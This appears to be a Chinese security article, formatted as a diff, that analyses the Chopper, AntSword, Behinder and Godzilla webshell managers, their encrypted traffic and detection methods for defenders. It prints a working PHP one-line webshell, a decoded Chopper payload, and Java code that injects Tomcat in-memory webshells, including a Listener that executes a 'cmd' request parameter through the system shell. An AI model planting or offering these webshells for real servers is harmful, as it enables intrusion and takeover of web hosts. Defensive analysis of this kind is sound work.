@@ -1,0 +1,440 @@
+## 前言
+
+在网络安全实战攻防演练中，只有了解攻击方的攻击思路和运用武器，防守方才能有效应对。以WebShell
+为例，由于企业对外提供服务的应用通常以Web形式呈现，因此Web站点经常成为攻击者的攻击目标。攻击者找到Web站点可利用的漏洞后，通常会在Web站点植入WebShell程序，从而实现对目标站点的控制。为了躲避防守方的检测，攻击方加密WebShell成为常态，由于流量加密，传统的WAF、WebIDS设备难以检测，给防守方监控带来巨大的挑战。因此，防守方需要了解攻击方使用的加密武器，才能找到相应的破解方式。
+
+**本文将通过分析目前攻击方常用的四大主流WebShell管理工具：中国菜刀、中国蚁剑、冰蝎Shell管理工具、哥斯拉Shell管理工具，探讨其加密特征，为防守方提供一些新的检测思路**
+**。**
+
+## 中国菜刀
+
+中国菜刀（Chopper）是一款经典的网站管理工具，具有文件管理、数据库管理、虚拟终端等功能。
+
+### 服务端
+
+    
+    
+    <?php eval($_POST["Sp4ar"]);?>
+
+其中‍Sp4ar是连接密码，可以随意更改。也可对服务端做一些混淆操作，防止被查杀。
+
+### 配置
+
+    
+    
+    <T>类型</T> 类型可为MYSQL,MSSQL,ORACLE,INFOMIX中的一种
+    <H>主机地址<H> 主机地址可为机器名或IP地址，如localhost
+    <U>数据库用户</U> 连接数据库的用户名，如root
+    <P>数据库密码</P> 连接数据库的密码，如123456
+    <L>编码类型</L> utf8,gbk等数据编码类型
+    ASP和ASP.NET脚本：
+    <T>类型</T> 类型只能填ADO
+    <C>ADO配置信息</C>
+    ADO连接各种数据库的方式不一样。如MSSQL的配置信息为
+    Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456
+    在设置好配置之后可以对网站数据库，文件等进行管理。
+    
+
+在设置好配置之后可以对网站数据库，文件等进行管理。
+
+![](https://image.3001.net/images/20210403/1617385706_606758ea8c7e36b7d1856.png!small)
+
+![](https://image.3001.net/images/20210403/1617385734_60675906f21cdb41e2cbe.png!small)
+
+![](https://image.3001.net/images/20210403/1617385765_60675925bf821949d23c8.png!small)
+
+###  **通信流量**
+
+    
+    
+    POST /u.php HTTP/1.1
+    X-Forwarded-For: 1*.***.*.***
+    Referer: http://1*.***.*.***
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+    Host: 1*.***.*.***
+    Content-Length: 690
+    Connection: Close
+    Cache-Control: no-cache
+    Cookie: PHPSESSID=m4mi07jn4u6cd3gmhdt97fmq55
+    ​
+    Sp4ar=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
+
+ **（1）请求侧**
+
+从payload中可以看出，eval后面卡了一个%01的字符，这样的语法在高版本的php中无法执行，低版本抛出warning后正常执行。获取z0的值并进行base64解码之后传入eval执行，z0解码之后的内容为：
+
+    
+    
+    @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;echo("|<-");die();
+
+ **（2）响应侧**
+
+从请求侧的代码来看，执行结果会被包裹在->| |<-中，抓包查看：
+
+![](https://image.3001.net/images/20210403/1617385834_6067596a0814185a05a16.png!small)
+
+![](https://image.3001.net/images/20210403/1617385918_606759be792981030ad79.png!small)可以发现执行结果确实是在->||<-中。
+
+###  **检测**
+
+文件检测：通过静态文件的方式进行WebShell查杀。
+
+流量检测：通过检测通信中的eval，base64_decode等关键字。
+
+## 中国蚁剑
+
+中国蚁剑与中国菜刀相比，界面更加美观、功能更加齐全，并且自定义的程度更高且开放源代码。
+
+###  **服务端**
+
+中国蚁剑的服务端会根据不同编码器有所变化，但还是从最基础的开始分析：
+
+    
+    
+    <?php eval($_POST["Sp4ar"]);?> //pwd表示连接密码，可以随意更换
+
+###  **配置**
+
+编辑/新增记录的时候可以自定义头部字段，选择编/解码器以及一些其他设置。中国蚁剑默认的UA头是antSword/v版本号，目前已经被很多安全产品标记，所以在配置的时候通常会更改，改UA头的方式有两种：一、添加Shell的时候在请求信息中添加User-Agent字段覆盖掉原始的值，二、在modules/request.js修改USER_AGENT的值。第一种方法只针对当前添加的记录生效，第二种方法针对所有的shell都生效。
+
+中国蚁剑的编/解码器可以对请求/响应侧的流量进行编/解码以绕过流量检测，在最新版的中国蚁剑中(v2.1.11)默认的编码器有五个，解码器有三个。
+
+ **（1）编码器**
+
+编码器是在发送数据到服务端之前对payload进行相关处理，目的是为了绕过请求侧的流量检测，默认的编码器：
+
+> default编码器：不对传输的payload进行任何操作。
+>
+> base64编码器：对payload进行base64编码。
+>
+> chr编码器：对payload的所有字符都利用利用chr函数进行转换。
+>
+> chr16编码器：对payload的所有字符都利用chr函数转换，与chr编码器不同的是chr16编码器对chr函数传递的参数是十六进制。
+>
+> rot13编码器：对payload中的字母进行rot13转换。
+>
+> 以上五种编码为中国蚁剑自带的，不需要配置就可以直接使用，除此之外，还存在一个RSA编码器，该编码器将
+>
+> RSA编码器：该编码器默认不展示，需要自己配置。配置方法：在编码管理界面点击生成RSA配置生成公钥、私钥和PHP代码，然后点击新建编码器选择PHP
+> RSA之后输入编码器的名字即可。
+
+ **（2）解码器**
+
+解码器主要是对接收到的数据进相关处理，目的是为了绕过响应侧的流量检测，默认的解码器：
+
+> default解码器：不对响应数据进行处理。
+>
+> base64解码器：将收到的数据进行base64解码。
+>
+> rot13解码器：将收到的数据进行rot13转换，由于英文字母一共26个所以置换两次之后会还原。
+
+### 通信流量
+
+ **（1）请求侧**
+
+针对不同编码器请求侧的流量有所不同
+
+默认编码器发送的数据如下：
+
+![](https://image.3001.net/images/20210403/1617386123_60675a8b8e4dce2447a12.png!small)base64编码器发送数据如下：
+
+![](https://image.3001.net/images/20210403/1617386163_60675ab399add5616d4f9.png!small)chr：
+
+![](https://image.3001.net/images/20210403/1617386201_60675ad980e3706c3013e.png!small)chr16：
+
+![](https://image.3001.net/images/20210403/1617386228_60675af441113c4a0a520.png!small)rot13:
+
+![](https://image.3001.net/images/20210403/1617386260_60675b1403a30bf197ec3.png!small)rsa:
+
+![](https://image.3001.net/images/20210403/1617386299_60675b3bcba6937f17b52.png!small)
+**（2）响应侧**
+
+采用不同解码器响应方向的数据也不同。
+
+default：
+
+![](https://image.3001.net/images/20210403/1617386351_60675b6fdbec06fc3179c.png!small)base64：
+
+![](https://image.3001.net/images/20210403/1617386378_60675b8ae20af2520975b.png!small)rot13：
+
+![](https://image.3001.net/images/20210403/1617386401_60675ba176b1e759880e5.png!small)
+**检测**
+
+1\. 文件检测：通过静态文件的方式进行WebShell查杀
+
+2\. 流量检测：针对不同的编码器流量特征不相同。
+
+针对前面1.2.1中的前五种编码器，可以检测关键字。
+
+针对rsa编码器：由于数据完全加密所以无法使用关键字检测。仔细观察加密之后的数据可以知道：在长度足够的情况下，每相隔固定的长度就会出现一个|字符，分析编码器可知，加密时是先将原始的payload进行分段然后对每一个段进行加密并以base64的格式输出。在rsa加密算法中密文长度等于密钥长度，明文长度不超过密钥长度。由于payload长度比密文长很多所以在加密是必须切割，但是无论怎么切割加密之后的数据长度都是都是固定的，所以在检测的时候可以根据这一特性来进行检测。由于输出结果是base64编码的所以每一个段的数据的字符都是在a-zA-Z0-9+=/之间，每一个段之间都有一个分隔符，当密钥长度是1024位的时候，每个段的明文长度是172，该编码器默认生成的长度是1024且在前端无法更改，但是可以通过替换antData目录下的key_rsa和key_rsa.pub两个文件来更换密钥长度，这两个文件可以通过openssl生成。
+
+生成方式如下：
+
+1\. 生成rsa私钥
+
+    
+    
+    openssl genrsa -out key_rsa 2048
+
+2\. 生成公钥
+
+    
+    
+    openssl rsa -in key_rsa -pubout -out key_rsa.pub
+
+然后分别替换key_rsa和key_rsa.pub即可。替换之后可以发现每个分段的长度明显增加从之前的172变成344，当密钥长度增加到3072时，分段长度增加到512，同时加密所需时间明显增加。
+
+##  **冰蝎Shell管理工具**
+
+冰蝎Shell管理工具是一款流行的、采用二进制动态加密传输数据的网站管理工具。
+
+###  **服务端**
+
+相关链接:
+
+《利用动态二进制加密实现新型一句话木马之Java篇》：
+
+https://xz.aliyun.com/t/2744
+
+《利用动态二进制加密实现新型一句话木马之.NET篇》：
+
+https://xz.aliyun.com/t/2758
+
+《利用动态二进制加密实现新型一句话木马之PHP篇》：
+
+https://xz.aliyun.com/t/2774
+
+###  **配置**
+
+目前冰蝎Shell管理工具的配置仅支持代理和自定义HTTP头部。
+
+###  **通信流量**
+
+ **（1）请求侧**
+
+![](https://image.3001.net/images/20210403/1617386444_60675bcc25581706a62ab.png!small)
+
+ **（2）响应侧**
+
+![](https://image.3001.net/images/20210403/1617386478_60675bee845915e71366a.png!small)
+**检测**
+
+1\. 文件检测：文件的特征主要在解密算法部分和执行payload的部分。
+
+2\.
+流量检测：由于最新版冰蝎Shell管理工具这个交互过程都采用加密传输，无法采用检测关键字的方法进行检测。相比于2.0的版本，3.0去除了协商密钥的过程，但这带来了一个问题就是，整个过程的密钥是不变的，同时分析冰蝎的源码可以发现：在传输php，jsp，aspx时前面的字段是固定的，这就导致了在一个WebShell中每一个流的前面的字节都是相同，php前面是assert|eval(base64_decode(、csharp是dll文件的头部格式、java则是class文件的头部格式。由于asp（php无法加载openssl时）采用异或对payload进行运算，根据异或的特征（两次异或即还原数据）可以使用密文以原始的payload的前十六位进行异或得到的就是密钥，再用密钥对整体数据进行解密即可还原出明文。
+
+3\. 异常进程检测：当冰蝎Shell管理工具执行命令是可以发现系统中会创建两个进程（父子关系）来执行命令。
+
+![](https://image.3001.net/images/20210403/1617386510_60675c0e98ab1576cca11.png!small)
+
+当启用虚拟终端时同样如此。
+
+![](https://image.3001.net/images/20210403/1617386688_60675cc07de26c56aa7b4.png!small)
+
+## 哥斯拉Shell管理工具
+
+​哥斯拉Shell管理工具与冰蝎Shell管理工具类似，通信过程都是加密流量，工具界面如下：
+
+![](https://image.3001.net/images/20210403/1617386742_60675cf64f975de9d974d.png!small)
+
+###  **WebShell连接**
+
+作者已经内置了Payload以及加密器，以JavaDynamicPayload为例，我们生成一个WebShell查看代码。
+
+![](https://image.3001.net/images/20210403/1617386767_60675d0f37f5522d89853.png!small)
+
+Unicode解码后代码：
+
+![](https://image.3001.net/images/20210403/1617386796_60675d2c0d62d96acc959.png!small)
+
+字符串xc为自定义秘钥(pass)MD5的前16位。
+
+![](https://image.3001.net/images/20210403/1617386824_60675d48753a7b7c85a2b.png!small)
+
+拼接自定义的密码和秘钥获取md5值， 这里的md5值作为认证密码和密钥,主要代码逻辑如下：
+
+![](https://image.3001.net/images/20210403/1617386853_60675d650d3e08595e01d.png!small)
+
+####
+抓取连接Shell地址过程数据包，一共进行了三次请求响应：![](https://image.3001.net/images/20210403/1617386882_60675d82caafbaf8fba99.png!small)
+
+![](https://image.3001.net/images/20210403/1617386939_60675dbb25ea035be108f.png!small)![](https://image.3001.net/images/20210403/1617386993_60675df1c0587836573eb.png!small)
+
+JavaAesBase64类初始化方法如下，加解密方法与生成的WebShell相对应：![](https://image.3001.net/images/20210403/1617387030_60675e16d7412ec00f0d2.png!small)
+
+![](https://image.3001.net/images/20210403/1617387068_60675e3c0aa77de5d7462.png!small)
+
+###  **流量端检测思路**
+
+围绕流量测的检测思路，因为其流量加密的特性，其实与冰蝎Shell管理工具想法大致相同，往往需要多种弱特征结合验证，如可以通过分析Shell连接过程的简单固有特征，结合数据统计分析来进行检测等。
+
+###  **内存马**
+
+内存马特点：文件无需落地，更加隐蔽。以tomcat为例，内存马分为以下三种：Servlet、Filter、Listener
+
+ **（1）Servlet内存马**
+
+以一个简单的Servletdemo为例，访问url，查看tomcat对应的调用栈如下：
+
+####
+![](https://image.3001.net/images/20210403/1617387113_60675e693987c7a67117a.png!small)
+
+我们知道通过web.xml或者注解的方式可以配置自定义的servlet与url的映射。而在tomcat中，Wrapper等效于Servlet，即我们只要自定义的实现该逻辑，就可实现Servlet内存马。
+
+Servlet3.0开始提供了动态注册filter、Servlet、Listener，这里不再赘述，感兴趣的可以自己调试验证下，主要逻辑为：
+
+创建自定义Servlet
+
+使用Wrapper对应进行封装
+
+添加封装后的Wrapper到StandardContext的children当中
+
+添加ServletMapping将访问的URL和Servlet进行绑定
+
+如234步骤实现代码如下：
+
+    
+    
+    // 获取StandardContext
+        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
+    
+    
+        // 用Wrapper对其进行封装
+        org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
+        newWrapper.setName("sangfor");
+        newWrapper.setLoadOnStartup(1);
+        newWrapper.setServlet(servlet);
+        newWrapper.setServletClass(servlet.getClass().getName());
+        // 添加封装后的恶意Wrapper到StandardContext的children当中
+        standardCtx.addChild(newWrapper);
+        // 添加ServletMapping将访问的URL和Servlet进行绑定
+        standardCtx.addServletMapping("/sangfor","sangfor");
+
+ **（3）Listener内存马**
+
+请求站点时，优先级如下，Listener -> Filter -> Servlet，Listener是最先被加载的
+
+当设置了ServletRequestListener时，每次请求都会先进入Listener 进行逻辑判断
+
+Listen监视器分类：
+
+ServletContext监听, 服务启动和停止时触发
+
+Session监听, Session初始化和销毁时触发
+
+Request监听, 访问服务时触发
+
+我们需要通过Request这个点来实现，即ServletRequestListener，主要逻辑：
+
+自定义Listener
+
+调用StandardContext对象的addApplicationEventListener方法来添加Listenner
+
+（直接使用ApplicationContext的addListenner方法来动态添加Listener会进行web容器状态判断）
+
+主要代码如下：
+
+    
+    
+    //listener
+    ServletRequestListener demoListener = new ServletRequestListener() {
+     @Override
+     public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+     }
+     @Override
+     public void requestInitialized(ServletRequestEvent sre) {
+     System.out.println("requestInitialized");
+     String cmd = sre.getServletRequest().getParameter("cmd");
+     try{
+     //获取sre中的requestFacade对象
+     org.apache.catalina.connector.RequestFacade requestFacade =
+    (org.apache.catalina.connector.RequestFacade)sre.getServletRequest();
+    ​
+    ​
+     //反射获取RequestFacade中的request对象
+     java.lang.reflect.Field connrequestField =
+    org.apache.catalina.connector.RequestFacade.class.getDeclaredField("request");
+     connrequestField.setAccessible(true);
+     org.apache.catalina.connector.Request request =
+    (org.apache.catalina.connector.Request) connrequestField.get(requestFacade);
+     //执行命令并回显
+     String[] cmds =
+    !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]
+    {"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+     java.io.InputStream in =
+    Runtime.getRuntime().exec(cmds).getInputStream();
+     java.util.Scanner s = new
+    java.util.Scanner(in).useDelimiter("\\a");
+     String output = s.hasNext() ? s.next() : "";
+     java.io.Writer writer = request.getResponse().getWriter();
+     java.lang.reflect.Field usingWriter =
+    request.getResponse().getClass().getDeclaredField("usingWriter");
+     usingWriter.setAccessible(true);
+     usingWriter.set(request.getResponse(), Boolean.FALSE);
+     writer.write(output);
+     writer.flush();
+     }catch (Exception e){
+     e.printStackTrace();
+     }
+     }
+    };
+    //获取standardContext
+    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
+    (org.apache.catalina.loader.WebappClassLoaderBase)
+    Thread.currentThread().getContextClassLoader();
+    org.apache.catalina.core.StandardContext standardCtx =
+    (org.apache.catalina.core.StandardContext)webappClassLoaderBase.getResources().
+    getContext();
+    //添加监听器
+    standardCtx.addApplicationEventListener(demoListener);
+
+ **（4）哥斯拉Shell管理工具实现内存马**
+
+我们再回过头来看下哥斯拉Shell管理工具中内存马的实现，内部实现了不同webshell的内存马，使用jd-gui工具打开class文件，可以看到，C刀，冰蝎不同shell的实现逻辑大相径庭，根据其shell管理工具进行了修改：
+
+![](https://image.3001.net/images/20210403/1617387158_60675e966529e94019200.png!small)
+
+![](https://image.3001.net/images/20210403/1617387183_60675eafcd7ff19fecb4c.png!small)
+
+![](https://image.3001.net/images/20210403/1617387231_60675edf235805f7c2f95.png!small)
+
+ **（5）内存马检测**
+
+有了其攻击手段的实现，防御检测思路也不断更新替换，上述也仅仅是tomcat的实现思路，不同容器框架的具体实现也需要对应的进行封装修改，但其思路大致相同。
+
+万变不离其宗，在主机侧，我们可以通过以下维度是进行检测：
+
+> 攻击行为固有行为特征
+>
+> 不同于正常业务的特殊共性
+>
+> 高危敏感行为检测
+
+网上已有不少主机侧检测思路，如：
+
+> 核心特点均会是被加载进jvm的类，即思路为遍历获取每个类，通过类黑名单、高危风险类筛选检测
+>
+>
+> 内存马不落地，即本地不存在对应class文件，攻击者又会在内存马中放置危险操作这两个特性，检测对应ClassLoader目录文件是否存在class文件。我们再dump对应class（如filter）进行check
+
+我们也可以通过RASP技术注入监测阻断恶意敏感操作，也可以达到比较好的类隔离效果。
+
+##  **总结**
+
+安全本质上就是一个攻防对抗的过程，随着攻击方式的不断升级变形，防守再也在不是一成不变，固守单一防御检测手段，只会止步不前。而在WebShell检测领域，随着WebShell的更新迭代，流量测加密、更加隐蔽攻击手段已成为趋势，防守方不仅要在流量检测方面提升效果，在主机侧检测也需同步更新升级，相信在不久的未来，检测防御WebShell的技术也会更加成熟有效。
+
+##  **参考链接**
+
+https://www.freebuf.com/sectool/252840.html
+
+http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/
+
+https://my.oschina.net/u/4593189/blog/4805061
+
+https://github.com/feihong-cs/memShell
+
+https://gv7.me/articles/2020/kill-java-web-filter-memshell/
+
